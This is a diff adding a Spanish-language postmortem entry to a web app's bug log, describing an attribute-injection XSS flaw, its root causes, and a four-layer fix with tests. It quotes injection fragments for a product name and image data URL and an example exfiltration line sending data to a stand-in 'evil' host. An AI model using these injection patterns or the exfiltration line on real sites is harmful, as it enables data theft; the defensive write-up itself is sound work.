@@ -483,3 +483,68 @@ Cuando el backend exige un campo, tiene que haber un test de que el cliente lo m
 > **Los dos bugs del mismo día comparten raíz:** el test usaba algo que no se comportaba
 > como la realidad — un mock permisivo en uno, un cliente imaginario en el otro. Las 597
 > pruebas en verde daban una confianza que no correspondía.
+
+---
+
+## BUG-26 — XSS por inyección en atributos: tres vías, una sola raíz 🔴🔥
+**Fecha:** 29/07/2026 · **Riesgo:** 🔴 ALTO · **Verificado explotable antes del fix**
+
+**Descripción.** Tres vectores distintos permitían ejecutar JavaScript en el origen de la
+app. Con acceso a: las ventas y clientes (descifrados en memoria vía `DB.getAll()`), el
+código de licencia, el token CSRF y todo el localStorage.
+
+| Vector | Cómo llega el payload |
+|---|---|
+| **Nombre de perfume** | Tipeado **o importado de un Excel** que te manden |
+| **Foto de perfume** | Backup JSON restaurado |
+| **Logo del negocio** | Backup JSON restaurado |
+
+**Prueba de que era real** (no teórico): se ejecutó `window.__XSS = true` por los tres
+caminos antes de arreglarlo. El nombre `Yara" onmouseover="…" x="` dejaba los atributos
+`onmouseover` y `x` como atributos reales en el botón.
+
+**Causa raíz — una sola.** `esc()` usa `textContent` → `innerHTML`, que escapa `&`, `<` y
+`>` pero **NO las comillas**. Sirve para contenido de texto, pero estaba usado dentro de
+atributos, donde una comilla cierra el atributo e inyecta uno nuevo.
+
+Sumado a eso, la validación de imágenes miraba **solo el prefijo**:
+`/^data:image\//.test(v)` — el resto de la cadena nunca se revisaba, así que
+`data:image/png,x" onerror="…` pasaba.
+
+**Solución — cuatro capas.**
+1. **`escAttr()`** en `11-utils.js`: escapa `& < > " '`. Va en **todo** valor que entre
+   entre comillas de un atributo. Reemplazado en render, clientes, recordatorios,
+   nueva-venta, importar y negocio.
+2. **`esImagenSegura()` / `imgSrc()`**: valida la cadena **completa** contra
+   `^data:image/(png|jpe?g|webp|gif|avif);base64,…$`. **SVG queda afuera** a propósito.
+   Ningún `<img src="${…}"` queda sin pasar por `imgSrc()`.
+3. **`_sanearImportado()`** en el restore: un backup es un archivo de cualquiera. Las
+   fotos y el perfil se sanean **antes de entrar a la base**, no solo al renderizar — si el
+   dato entra sucio, cualquier render nuevo que se olvide de validar reabre el agujero.
+4. **CSP más chica**: `img-src` sin `https:` — con XSS,
+   `new Image().src='https://evil/?d='+datos` exfiltraba todo y la CSP no lo frenaba.
+   Ninguna imagen de la app es externa. De paso se sacaron Google Fonts (las fuentes son
+   locales) y OneSignal (no hay SDK en el cliente).
+
+**Bug encontrado dentro del propio fix.** El primer intento usaba
+`encodeURIComponent(c.key)` para el `onclick` del cliente. **`encodeURIComponent` no escapa
+el apóstrofo**, así que un cliente "O'Brien" seguía rompiendo el string de JS. Lo detectó el
+test porque estaba escrito con el nombre real, no con un payload aproximado. De ahí el
+`.replace(/'/g, '%27')`.
+
+**Archivos.** `src/app/11-utils.js`, `02-render.js`, `04-stock.js`, `10-data-management.js`,
+`18-clientes.js`, `20-recordatorios.js`, `03-nueva-venta.js`, `26-importar-excel.js`,
+`27-negocio.js`, `_headers`, `tests/xss.spec.js` (12 tests), `tests/features.test.js`
+
+**Verificado al revés:** volviendo la validación a solo-prefijo, **7 tests fallan**,
+incluido el que comprueba que el XSS no se ejecute.
+
+**Reglas derivadas.**
+- 🔴 **`esc()` es para texto. `escAttr()` es para atributos.** No son intercambiables, y
+  `esc()` en un atributo no protege nada.
+- 🔴 **Validar un prefijo no es validar.** Si el formato tiene una forma, la regex la
+  describe entera y va anclada de punta a punta.
+- 🔴 **Sanear en el render no alcanza.** El dato se limpia al **entrar**, si no el próximo
+  render que se olvide vuelve a abrir el agujero.
+- 🟠 **La CSP también es contención de daño**, no solo prevención: un permiso que nadie usa
+  es una vía de salida gratis para el atacante.
